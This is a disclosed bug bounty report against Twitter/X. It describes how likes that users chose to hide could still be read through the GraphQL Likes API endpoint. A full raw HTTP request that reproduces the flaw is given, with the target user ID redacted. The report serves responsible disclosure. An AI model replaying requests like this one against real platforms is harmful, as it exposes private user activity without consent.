# Ability to see hidden likes

## Report Details
- **Report ID**: 2140960
- **URL**: https://hackerone.com/reports/2140960
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-09-08T15:27:29.531Z
- **Disclosed**: 2024-05-10T22:07:52.439Z

## Reporter
- **Username**: mirhat
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:**

Twitter/X recently added an feature that allows you to hide your likes. It's still possible to see the liked tweets via graphql API.

**Description:** 
I was testing the GraphQL API and it's still possible to view tweets.
You need to be subscribed to X premium to hide your likes. However you don't need a premium account to reproduce this vulnerability.

Twitter user with the id of `████████`has their likes hidden. However if you copy the request below and send it you will see JSON data of likes returned back to you. 

## Steps To Reproduce:

  1. Copy the raw http request below
  1. Paste it into your proxy (change the userId in the url if you want to test against another user. %22%3A%22████%22%2C%22 )
  1. Send the request

## Supporting Material/References:

Vulnerable HTTP request

``` 
GET /i/api/graphql/lVf2NuhLoYVrpN4nO7uw0Q/Likes?variables=%7B%22userId%22%3A%22██████████%22%2C%22count%22%3A20%2C%22includePromotedContent%22%3Afalse%2C%22withClientEventToken%22%3Afalse%2C%22withBirdwatchNotes%22%3Afalse%2C%22withVoice%22%3Atrue%2C%22withV2Timeline%22%3Afalse%7D&features=%7B%22responsive_web_graphql_exclude_directive_enabled%22%3Atrue%2C%22verified_phone_label_enabled%22%3Afalse%2C%22creator_subscriptions_tweet_preview_api_enabled%22%3Atrue%2C%22responsive_web_graphql_timeline_navigation_enabled%22%3Atrue%2C%22responsive_web_graphql_skip_user_profile_image_extensions_enabled%22%3Afalse%2C%22tweetypie_unmention_optimization_enabled%22%3Atrue%2C%22responsive_web_edit_tweet_api_enabled%22%3Atrue%2C%22graphql_is_translatable_rweb_tweet_is_translatable_enabled%22%3Atrue%2C%22view_counts_everywhere_api_enabled%22%3Atrue%2C%22longform_notetweets_consumption_enabled%22%3Atrue%2C%22responsive_web_twitter_article_tweet_consumption_enabled%22%3Afalse%2C%22tweet_awards_web_tipping_enabled%22%3Afalse%2C%22freedom_of_speech_not_reach_fetch_enabled%22%3Atrue%2C%22standardized_nudges_misinfo%22%3Atrue%2C%22tweet_with_visibility_results_prefer_gql_limited_actions_policy_enabled%22%3Atrue%2C%22longform_notetweets_rich_text_read_enabled%22%3Atrue%2C%22longform_notetweets_inline_media_enabled%22%3Atrue%2C%22responsive_web_media_download_video_enabled%22%3Afalse%2C%22responsive_web_enhance_cards_enabled%22%3Afalse%7D HTTP/2
Host: twitter.com
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: */*
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://twitter.com/██████/likes
Content-Type: application/json
X-Twitter-Auth-Type: OAuth2Session
X-Csrf-Token:
X-Twitter-Client-Language: en
X-Twitter-Active-User: yes
X-Client-Transaction-Id: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Authorization: 
```

## Impact

Viewing hidden likes

## Attachments
No attachments
